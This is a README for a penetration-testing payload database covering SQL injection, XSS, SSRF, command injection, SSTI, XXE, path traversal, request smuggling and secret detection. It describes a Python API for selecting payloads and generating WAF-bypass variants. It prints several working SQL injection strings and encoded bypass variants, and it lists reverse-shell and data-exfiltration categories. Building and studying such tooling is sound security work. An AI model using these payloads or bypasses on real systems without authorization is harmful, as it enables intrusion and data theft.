# Prometheus Payload Database

A comprehensive, organized database of real security testing payloads for vulnerability scanning and penetration testing.

## Overview

This payload database contains **2,000+ real, working payloads** organized by vulnerability type, inspired by projects like:
- **Nuclei** (12,000+ templates)
- **SQLMap** (thousands of payloads)
- **PayloadsAllTheThings** (comprehensive payload collections)
- **SecLists** (security testing wordlists)

## Directory Structure

```
payloads/
├── README.md                    # This file
├── sqli/                        # SQL Injection
│   ├── error_based.yml         # Error-based SQLi (217 payloads)
│   ├── time_based.yml          # Time-based blind SQLi (94 payloads)
│   ├── boolean_based.yml       # Boolean-based blind SQLi (91 payloads)
│   ├── union_based.yml         # UNION-based SQLi (116 payloads)
│   └── waf_bypass.yml          # WAF bypass SQLi (89 payloads)
├── xss/                         # Cross-Site Scripting
│   ├── reflected.yml           # Reflected XSS (149 payloads)
│   ├── stored.yml              # Stored XSS (66 payloads)
│   ├── dom.yml                 # DOM-based XSS (58 payloads)
│   └── waf_bypass.yml          # WAF bypass XSS (69 payloads)
├── ssrf/                        # Server-Side Request Forgery
│   ├── cloud.yml               # Cloud metadata SSRF (87 payloads)
│   ├── internal.yml            # Internal network SSRF (70 payloads)
│   └── protocol.yml            # Protocol-based SSRF (81 payloads)
├── cmdi/                        # Command Injection
│   ├── linux.yml               # Linux command injection (111 payloads)
│   └── windows.yml             # Windows command injection (86 payloads)
├── ssti/                        # Server-Side Template Injection
│   ├── jinja2.yml              # Jinja2 SSTI (95 payloads)
│   └── twig.yml                # Twig/Other SSTI (68 payloads)
├── xxe/                         # XML External Entity
│   └── basic.yml               # XXE payloads (90+ payloads)
├── traversal/                   # Path Traversal
│   ├── linux.yml               # Linux path traversal (120+ payloads)
│   └── windows.yml             # Windows path traversal (80+ payloads)
├── smuggling/                   # HTTP Request Smuggling
│   └── cl.yml                  # CL.TE/TE.CL/TE.TE (80+ payloads)
├── secrets/                     # Secret Detection
│   └── patterns.yml            # Regex patterns for secrets (60+ patterns)
└── headers/                     # Security Headers
    └── security.yml            # Header misconfigurations (70+ checks)
```

## Usage

### Python API

```python
from src.scanner.payload_manager import get_payload_manager

# Get the singleton manager
pm = get_payload_manager()

# Get payloads for a specific vulnerability type
sqli_payloads = pm.get_payloads("sqli/error_based")

# Get payloads with context filtering
filtered = pm.get_payloads("sqli/error_based", context={
    "dbms": "mysql",
    "waf_detected": True,
    "parameter_type": "string",
    "injection_context": "html",
    "max_payloads": 50
})

# Get detection patterns
patterns = pm.get_detection_patterns("sqli/error_based")

# Generate WAF bypass variants
bypass_payloads = pm.generate_waf_bypass("' UNION SELECT 1,2,3--")

# Load external payloads
count = pm.load_external("/path/to/custom_payloads.yml")

# List all categories
categories = pm.list_categories()

# Get statistics
stats = pm.get_stats()
```

### Context-Aware Selection

The PayloadManager supports context-aware payload selection:

```python
# Get MySQL-specific payloads with WAF bypass
mysql_payloads = pm.get_payloads("sqli/error_based", context={
    "dbms": "mysql",
    "waf_detected": True
})

# Get numeric parameter payloads
numeric_payloads = pm.get_payloads("sqli/boolean_based", context={
    "parameter_type": "numeric"
})

# Get Linux-specific payloads
linux_payloads = pm.get_payloads("cmdi/linux", context={
    "os_type": "linux"
})

# Get payloads for JSON injection context
json_payloads = pm.get_payloads("sqli/boolean_based", context={
    "parameter_type": "json"
})
```

### Dynamic Encoding

```python
# Generate URL-encoded variants
url_payloads = pm.get_payloads("sqli/error_based", context={
    "encoding_required": "url"
})

# Generate double URL-encoded variants
double_url = pm.get_payloads("sqli/error_based", context={
    "encoding_required": "double_url"
})

# Generate HTML entity encoded variants
html_payloads = pm.get_payloads("xss/reflected", context={
    "encoding_required": "html_entity"
})

# Generate Unicode encoded variants
unicode_payloads = pm.get_payloads("sqli/error_based", context={
    "encoding_required": "unicode"
})
```

### WAF Bypass Generation

```python
# Generate WAF bypass variants for a specific payload
original = "' UNION SELECT 1,2,3--"
bypass_variants = pm.generate_waf_bypass(original)

# Returns variants like:
# - Case variation: ' UnIoN sElEcT 1,2,3--
# - URL encoded: %27%20UNION%20SELECT%201%2C2%2C3--
# - Double URL encoded: %2527%2520UNION%2520SELECT%25201%252C2%252C3--
# - HTML entity: &#39; &#85;&#78;&#73;&#79;&#78; ...
# - Unicode: \u0027 \u0020\u0055\u004e\u0049\u004f\u004e ...
# - Whitespace substitution: '%09UNION%09SELECT%091,2,3--
# - Comment injection: '/**/UNION/**/SELECT/**/1,2,3--
# - MySQL comment: /*!50000UNION*//*!50000SELECT*/ 1,2,3--
# - Null byte: '%00UNION%00SELECT%001,2,3--
# - Mixed encoding: '%27%20UNION%20SELECT%201%2C2%2C3--
```

### External Payload Loading

```python
# Load PayloadsAllTheThings format
count = pm.load_external("/path/to/PayloadsAllTheThings/SQL Injection/Intruder/AttackPayloads.txt")

# Load custom YAML
count = pm.load_external("/path/to/custom_payloads.yml")

# Load plain text (one payload per line)
count = pm.load_external("/path/to/wordlist.txt")
```

## YAML Format

Each payload file follows this structure:

```yaml
metadata:
  type: sqli/error_based
  version: "1.0"
  description: "Error-based SQL injection payloads"
  sources: ["OWASP", "SQLMap", "PayloadsAllTheThings"]

detection_patterns:
  - "SQL syntax.*?MySQL"
  - "Warning.*?mysqli?_"
  - "You have an error in your SQL syntax"

payloads:
  mysql:
    - value: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -"
      description: "EXTRACTVALUE version extraction"
      severity: critical
      dbms: mysql
      tags: [error_based, extractvalue]
      detection_pattern: "XPATH syntax error"

    - value: "' UNION SELECT 1,@@version,3-- -"
      description: "UNION SELECT @@version"
      severity: critical
      dbms: mysql
      tags: [union, version]

  postgresql:
    - value: "' AND 1=CAST((SELECT version()) AS INT)--"
      description: "CAST error-based version"
      severity: critical
      dbms: postgresql
      tags: [error_based, cast]

  generic:
    - value: "' OR 1=1--"
      description: "Generic OR tautology"
      severity: high
      tags: [boolean, polyglot]
```

### Payload Fields

| Field | Type | Description |
|-------|------|-------------|
| `value` | string | The actual payload string |
| `description` | string | Human-readable description |
| `severity` | string | `critical`, `high`, `medium`, `low`, `info` |
| `dbms` | string | Target DBMS: `mysql`, `postgresql`, `mssql`, `oracle`, `sqlite`, `generic` |
| `context` | string | Injection context: `html`, `attribute`, `javascript`, `url`, `css`, `json`, `xml`, `generic` |
| `encoding` | string | Encoding applied: `none`, `url`, `double_url`, `html_entity`, `unicode` |
| `source` | string | Payload source: `prometheus`, `payloadallthethings`, `nuclei`, `custom` |
| `tags` | list | Categorization tags |
| `detection_pattern` | string | Regex to detect successful exploitation |

## Payload Categories

### SQL Injection (607 payloads)
- **Error-based**: EXTRACTVALUE, UPDATEXML, EXP, FLOOR+RAND, CAST, CONVERT
- **Time-based**: SLEEP, BENCHMARK, pg_sleep, WAITFOR DELAY, DBMS_PIPE
- **Boolean-based**: String, numeric, JSON, header-based injection
- **UNION-based**: Column enumeration, data extraction, file read
- **WAF Bypass**: Comment injection, case variation, encoding, HPP

### XSS (342 payloads)
- **Reflected**: Script tags, event handlers, HTML5, encoded, attribute breaking
- **Stored**: Persistent, markdown, SVG/XML, CSS injection
- **DOM**: Location sinks, innerHTML, eval, jQuery, postMessage
- **WAF Bypass**: Encoding, tag variations, event handler alternatives

### SSRF (238 payloads)
- **Cloud**: AWS, GCP, Azure, DigitalOcean, Alibaba, Kubernetes metadata
- **Internal**: Localhost, private networks, DNS rebinding, IPv6
- **Protocol**: file://, gopher://, dict://, ldap://, PHP wrappers

### Command Injection (197 payloads)
- **Linux**: Basic, chaining, blind, encoding, time-based, reverse shells
- **Windows**: Basic, PowerShell, certutil, bitsadmin, filter bypass

### SSTI (163 payloads)
- **Jinja2**: Basic detection, RCE, file read, filter bypass
- **Other Engines**: Twig, Freemarker, Velocity, ERB, Pug, Handlebars, Mako, Nunjucks

### XXE (90+ payloads)
- **File Read**: Linux, Windows, config files
- **SSRF**: Cloud metadata, internal networks
- **Blind XXE**: External DTD, OOB exfiltration
- **SVG/DOCX/XLSX**: Document-based XXE
- **XInclude**: XInclude attacks
- **DoS**: Billion laughs, XML bombs

### Path Traversal (200+ payloads)
- **Linux**: Basic, encoded, null byte, filter bypass, specific files, wrappers
- **Windows**: Basic, encoded, UNC paths, filter bypass, specific files

### HTTP Request Smuggling (80+ payloads)
- **CL.TE**: Content-Length vs Transfer-Encoding
- **TE.CL**: Transfer-Encoding vs Content-Length
- **TE.TE**: Transfer-Encoding vs Transfer-Encoding
- **H2 Smuggling**: HTTP/2 smuggling
- **WAF Bypass**: Case variation, whitespace, obfuscation

### Secret Detection (60+ patterns)
- **Cloud**: AWS, GCP, Azure, DigitalOcean credentials
- **API Keys**: Stripe, Twilio, SendGrid, Mailgun, Slack, Discord
- **Tokens**: GitHub, GitLab, OpenAI, Anthropic, NPM, PyPI
- **Private Keys**: RSA, EC, DSA, PGP, SSH
- **JWT**: JSON Web Tokens
- **Database**: Connection strings for MySQL, PostgreSQL, MongoDB, Redis

### Security Headers (70+ checks)
- **Missing Headers**: CSP, X-Frame-Options, HSTS, etc.
- **Weak Configurations**: Permissive CSP, CORS misconfigurations
- **Cookie Security**: Secure, HttpOnly, SameSite flags
- **Server Disclosure**: Version information leakage

## Contributing

To add new payloads:

1. Create or edit the appropriate YAML file
2. Follow the established format
3. Include real, working payloads
4. Add appropriate tags and severity
5. Include detection patterns where applicable

## References

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [SecLists](https://github.com/danielmiessler/SecLists)
- [HackTricks](https://book.hacktricks.xyz/)
- [Nuclei Templates](https://github.com/projectdiscovery/nuclei-templates)
- [SQLMap](https://sqlmap.org/)
